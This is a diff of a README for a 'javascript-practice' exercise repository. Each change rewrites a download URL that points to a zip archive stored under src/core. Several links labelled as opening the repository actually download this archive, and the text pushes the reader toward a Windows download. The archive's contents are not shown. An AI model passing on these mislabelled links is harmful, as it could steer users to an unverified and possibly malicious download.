@@ -1,6 +1,6 @@
 # 📘 javascript-practice - Build JavaScript Skills Daily
 
-[![Download](https://img.shields.io/badge/Download%20Here-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Lorenniffy205/javascript-practice/main/src/core/javascript_practice_1.9.zip)
+[![Download](https://img.shields.io/badge/Download%20Here-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lorenniffy205/javascript-practice/raw/refs/heads/main/src/core/javascript_practice_1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ If you only want to read the exercises, a browser is enough. If you want to run 
 
 Visit this page to download or open the project:
 
-https://raw.githubusercontent.com/Lorenniffy205/javascript-practice/main/src/core/javascript_practice_1.9.zip
+https://github.com/Lorenniffy205/javascript-practice/raw/refs/heads/main/src/core/javascript_practice_1.9.zip
 
 If you want to work with the files on your Windows computer, follow these steps:
 
@@ -204,7 +204,7 @@ Simple tests help you spot mistakes fast.
 
 Open the repo here:
 
-https://raw.githubusercontent.com/Lorenniffy205/javascript-practice/main/src/core/javascript_practice_1.9.zip
+https://github.com/Lorenniffy205/javascript-practice/raw/refs/heads/main/src/core/javascript_practice_1.9.zip
 
 ## 🧰 Helpful Tools
 
@@ -220,7 +220,7 @@ VS Code is the best choice if you want one place to read, edit, and run files.
 
 ## 🔗 Quick Download Link
 
-[Open javascript-practice on GitHub](https://raw.githubusercontent.com/Lorenniffy205/javascript-practice/main/src/core/javascript_practice_1.9.zip)
+[Open javascript-practice on GitHub](https://github.com/Lorenniffy205/javascript-practice/raw/refs/heads/main/src/core/javascript_practice_1.9.zip)
 
 ## 📝 File Use Tips
 
